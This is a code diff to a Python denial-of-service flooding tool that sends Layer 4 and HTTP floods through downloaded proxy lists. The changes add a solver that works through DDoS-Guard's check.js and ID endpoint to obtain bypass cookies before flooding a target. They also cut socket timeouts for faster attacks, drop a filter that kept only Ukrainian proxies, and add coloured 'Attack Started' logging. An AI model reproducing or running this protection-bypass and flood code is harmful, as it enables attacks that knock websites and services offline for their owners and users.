@@ -6,7 +6,7 @@ from itertools import cycle
 from json import load
 from logging import basicConfig, getLogger, shutdown
 from math import log2, trunc
-from multiprocessing import RawValue, cpu_count
+from multiprocessing import RawValue
 from os import urandom as randbytes
 from pathlib import Path
 from secrets import choice as randchoice
@@ -20,7 +20,7 @@ from sys import argv
 from sys import exit as _exit
 from threading import Event, Thread
 from time import sleep, time
-from typing import Any, List, Set, Tuple, Collection
+from typing import Any, List, Set, Tuple
 from urllib import parse
 from uuid import UUID, uuid4
 
@@ -48,48 +48,6 @@ __dir__: Path = Path(__file__).parent
 __ip__: Any = None
 
 
-class ProxyCheckerCustom(ProxyChecker):
-    @staticmethod
-    def checkAll(proxies: Collection[Proxy],
-                 url: Any = "https://httpbin.org/get",
-                 timeout=5,
-                 threads=1000):
-        with ThreadPoolExecutor(
-                max(min(round(len(proxies) * cpu_count()), threads),
-                    1)) as executor:
-    
-            future_to_proxy = dict()
-            for proxy in proxies:
-                print('proxy.country:', proxy.country)
-                if proxy.country == 'UA':
-                    future_to_proxy[executor.submit(proxy.check, url, timeout)] = proxy
-                    
-            
-            # future_to_proxy = {
-            #     executor.submit(proxy.check, url, timeout): proxy
-            #     for proxy in proxies if proxy.country == 'UA'
-            # }
-
-            for future in as_completed(future_to_proxy):
-                # print('future.running: ', future.running())
-                # if not future.running():
-                #     del future
-                #     print('future was deleted')
-                #     continue
-                if future.exception():
-                    print('future.exception: ', future.exception)
-                if future.result():
-                    # future_to_proxy[future]
-                    print('future.result :', future.result())
-
-            proxyes = {
-                future_to_proxy[future]
-                for future in as_completed(future_to_proxy) if future.result()
-            }
-            
-            return proxyes
-
-
 def getMyIPAddress():
     global __ip__
     if __ip__:
@@ -108,10 +66,24 @@ def getMyIPAddress():
         __ip__ = get('https://ip.42.pl/raw', timeout=.1).text
     return getMyIPAddress()
 
+  
+  
+class bcolors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKCYAN = '\033[96m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    RESET = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+
+
 
 def exit(*message):
     if message:
-        logger.error(" ".join(message))
+        logger.error(bcolors.FAIL +" ".join(message) + bcolors.RESET)
     shutdown()
     _exit(1)
 
@@ -217,6 +189,62 @@ class Tools:
         REQUESTS_SENT += 1
         return True
 
+    @staticmethod
+    def dgb_solver(url, host, ua, pro=None):
+        s = None
+        idss = None
+        with Session() as s:
+            if pro:
+                s.proxies=pro
+            hdrs = {
+                "User-Agent": ua,
+                "Accept": "text/html",
+                "Accept-Language": "en-US",
+                "Connection": "keep-alive",
+                "Sec-Fetch-Dest": "document",
+                "Sec-Fetch-Mode": "navigate",
+                "Sec-Fetch-Site": "none",
+                "Sec-Fetch-User": "?1",
+                "TE": "trailers",
+                "DNT": "1"
+                }
+            with s.get(url, headers=hdrs) as ss:
+                for key, value in ss.cookies.items():
+                    s.cookies.set_cookie(cookies.create_cookie(key, value))
+            hdrs = {
+                "User-Agent": ua,
+                "Accept": "*/*",
+                "Accept-Language": "en-US,en;q=0.5",
+                "Accept-Encoding": "gzip, deflate",
+                "Referer": url,
+                "Sec-Fetch-Dest": "script",
+                "Sec-Fetch-Mode": "no-cors",
+                "Sec-Fetch-Site": "cross-site"
+                }
+            with s.post("https://check.ddos-guard.net/check.js", headers=hdrs) as ss:
+                for key, value in ss.cookies.items():
+                    if key == '__ddg2':
+                        idss = value
+                    s.cookies.set_cookie(cookies.create_cookie(key, value))
+
+            hdrs = {
+                "User-Agent": ua,
+                "Accept": "image/webp,*/*",
+                "Accept-Language": "en-US,en;q=0.5",
+                "Accept-Encoding": "gzip, deflate",
+                "Cache-Control": "no-cache",
+                "Referer": url,
+                "Sec-Fetch-Dest": "script",
+                "Sec-Fetch-Mode": "no-cors",
+                "Sec-Fetch-Site": "cross-site"
+                }
+            with s.get(f"{url}.well-known/ddos-guard/id/{idss}", headers=hdrs) as ss:
+                for key, value in ss.cookies.items():
+                    s.cookies.set_cookie(cookies.create_cookie(key, value))
+                return s
+            
+        return False
+    
     @staticmethod
     def safe_close(sock=None):
         if sock:
@@ -325,7 +353,7 @@ class Layer4(Thread):
         else:
             s = socket(conn_type, sock_type, proto_type)
         s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
-        s.settimeout(60)
+        s.settimeout(.9)
         s.connect(self._target)
         return s
 
@@ -632,7 +660,7 @@ class HttpFlood(Thread):
             sock = socket(AF_INET, SOCK_STREAM)
 
         sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
-        sock.settimeout(60)
+        sock.settimeout(.9)
         sock.connect(self._raw_target)
 
         if self._target.scheme.lower() == "https":
@@ -827,28 +855,33 @@ class HttpFlood(Thread):
                 Tools.send(s, payload)
         Tools.safe_close(s)
 
+    
     def DGB(self):
         global REQUESTS_SENT, BYTES_SEND
-        s = None
-        with suppress(Exception), Session() as s:
-            with s.post(self._target.human_repr()) as ss:
-                ss.raise_for_status()
-                for key, value in ss.cookies.items():
-                    s.cookies.set_cookie(cookies.create_cookie(key, value))
-            for _ in range(min(self._rpc, 5)):
-                sleep(min(self._rpc, 5) / 100)
-                if self._proxies:
-                    pro = randchoice(self._proxies)
-                    with s.get(self._target.human_repr(),
-                               proxies=pro.asRequest()) as res:
+        with suppress(Exception):
+            if self._proxies:
+                pro = randchoice(self._proxies)
+                with Tools.dgb_solver(self._target.human_repr(),self._host,randchoice(self._useragents),pro.asRequest()) as ss:
+                    for _ in range(min(self._rpc, 5)):
+                        sleep(min(self._rpc, 5) / 100)
+                        with ss.get(self._target.human_repr(),
+                                    proxies=pro.asRequest()) as res:
+                            REQUESTS_SENT += 1
+                            BYTES_SEND += Tools.sizeOfRequest(res)
+                            continue
+                                
+                Tools.safe_close(ss)
+
+            with Tools.dgb_solver(self._target.human_repr(),self._host,randchoice(self._useragents)) as ss:
+                for _ in range(min(self._rpc, 5)):
+                    sleep(min(self._rpc, 5) / 100)
+                    with ss.get(self._target.human_repr()) as res:
                         REQUESTS_SENT += 1
                         BYTES_SEND += Tools.sizeOfRequest(res)
-                        continue
-
-                with s.get(self._target.human_repr()) as res:
-                    REQUESTS_SENT += 1
-                    BYTES_SEND += Tools.sizeOfRequest(res)
-        Tools.safe_close(s)
+                            
+            Tools.safe_close(ss)
+            
+        
 
     def DYN(self):
         payload: Any = str.encode(self._payload +
@@ -1025,9 +1058,8 @@ class ProxyManager:
             provider for provider in cf["proxy-providers"]
             if provider["type"] == Proxy_type or Proxy_type == 0
         ]
-        logger.info("Downloading Proxies from %d Providers" % len(providrs))
+        logger.info(f"{bcolors.WARNING}Downloading Proxies from {bcolors.OKBLUE}%d{bcolors.WARNING} Providers{bcolors.RESET}" % len(providrs))
         proxes: Set[Proxy] = set()
-        ports: Set[int] = set()
 
         with ThreadPoolExecutor(len(providrs)) as executor:
             future_to_download = {
@@ -1039,18 +1071,12 @@ class ProxyManager:
             for future in as_completed(future_to_download):
                 for pro in future.result():
                     proxes.add(pro)
-                    ports.add(pro.port)
-        min_port = min(ports)
-        max_port = max(ports)
-        logger.info(f'ports: {ports}')
-        
-        
         return proxes
 
     @staticmethod
     def download(provider, proxy_type: ProxyType) -> Set[Proxy]:
         logger.debug(
-            "Downloading Proxies from (URL: %s, Type: %s, Timeout: %d)" %
+            f"{bcolors.WARNING}Proxies from (URL: {bcolors.OKBLUE}%s{bcolors.WARNING}, Type: {bcolors.OKBLUE}%s{bcolors.WARNING}, Timeout: {bcolors.OKBLUE}%d{bcolors.WARNING}){bcolors.RESET}" %
             (provider["url"], proxy_type.name, provider["timeout"]))
         proxes: Set[Proxy] = set()
         with suppress(TimeoutError, exceptions.ConnectionError,
@@ -1120,9 +1146,9 @@ class ToolsConsole:
                         t = [(last - now) for now, last in zip(od, ld)]
 
                         logger.info(
-                            ("Bytes Sended %s\n"
+                            ("Bytes Sent %s\n"
                              "Bytes Recived %s\n"
-                             "Packets Sended %s\n"
+                             "Packets Sent %s\n"
                              "Packets Recived %s\n"
                              "ErrIn %s\n"
                              "ErrOut %s\n"
@@ -1328,15 +1354,15 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None):
     if proxy_ty == 6:
         proxy_ty = randchoice([4, 5, 1])
     if not proxy_li.exists():
-        logger.warning("The file doesn't exist, creating files and downloading proxies.")
+        logger.warning(f"{bcolors.WARNING}The file doesn't exist, creating files and downloading proxies.{bcolors.RESET}")
         proxy_li.parent.mkdir(parents=True, exist_ok=True)
         with proxy_li.open("w") as wr:
             Proxies: Set[Proxy] = ProxyManager.DownloadFromConfig(con, proxy_ty)
             logger.info(
-                f"{len(Proxies):,} Proxies are getting checked, this may take awhile!"
+                f"{bcolors.OKBLUE}{len(Proxies):,}{bcolors.WARNING} Proxies are getting checked, this may take awhile{bcolors.RESET}!"
             )
-            Proxies = ProxyCheckerCustom.checkAll(
-                Proxies, timeout=10, threads=threads,
+            Proxies = ProxyChecker.checkAll(
+                Proxies, timeout=1, threads=threads,
                 url=url.human_repr() if url else "http://httpbin.org/get",
             )
 
@@ -1352,10 +1378,10 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None):
 
     proxies = ProxyUtiles.readFromFile(proxy_li)
     if proxies:
-        logger.info(f"Proxy Count: {len(proxies):,}")
+        logger.info(f"{bcolors.WARNING}Proxy Count: {bcolors.OKBLUE}{len(proxies):,}{bcolors.RESET}")
     else:
         logger.info(
-            "Empty Proxy File, running flood witout proxy")
+            f"{bcolors.WARNING}Empty Proxy File, running flood witout proxy{bcolors.RESET}")
         proxies = None
 
     return proxies
@@ -1377,6 +1403,7 @@ if __name__ == '__main__':
 
                 method = one
                 host = None
+                port= None
                 url = None
                 event = Event()
                 event.clear()
@@ -1500,15 +1527,18 @@ if __name__ == '__main__':
                                proxies).start()
 
                 logger.info(
-                    "Attack Started to %s with %s method for %s seconds, threads: %d!"
-                    % (target or url.human_repr(), method, timer, threads))
+                    f"{bcolors.WARNING}Attack Started to{bcolors.OKBLUE} %s{bcolors.WARNING} with{bcolors.OKBLUE} %s{bcolors.WARNING} method for{bcolors.OKBLUE} %s{bcolors.WARNING} seconds, threads:{bcolors.OKBLUE} %d{bcolors.WARNING}!{bcolors.RESET}"
+                    % (target or url.host, method, timer, threads))
                 event.set()
                 ts = time()
                 while time() < ts + timer:
-                    logger.debug('PPS: %s, BPS: %s / %d%%' %
-                                 (Tools.humanformat(int(REQUESTS_SENT)),
+                    logger.debug(f'{bcolors.WARNING}Target:{bcolors.OKBLUE} %s,{bcolors.WARNING} Port:{bcolors.OKBLUE} %s,{bcolors.WARNING} Method:{bcolors.OKBLUE} %s{bcolors.WARNING} PPS:{bcolors.OKBLUE} %s,{bcolors.WARNING} BPS:{bcolors.OKBLUE} %s / %d%%{bcolors.RESET}' %
+                                 (target or url.host,
+                                  port or (url.port or 80),
+                                  method,
+                                  Tools.humanformat(int(REQUESTS_SENT)),
                                   Tools.humanbytes(int(BYTES_SEND)),
-                                  round((time() - ts) / timer * 100, 2)))
+                                  round((time() - ts) / timer * 100, 2)))  
                     REQUESTS_SENT.set(0)
                     BYTES_SEND.set(0)
                     sleep(1)
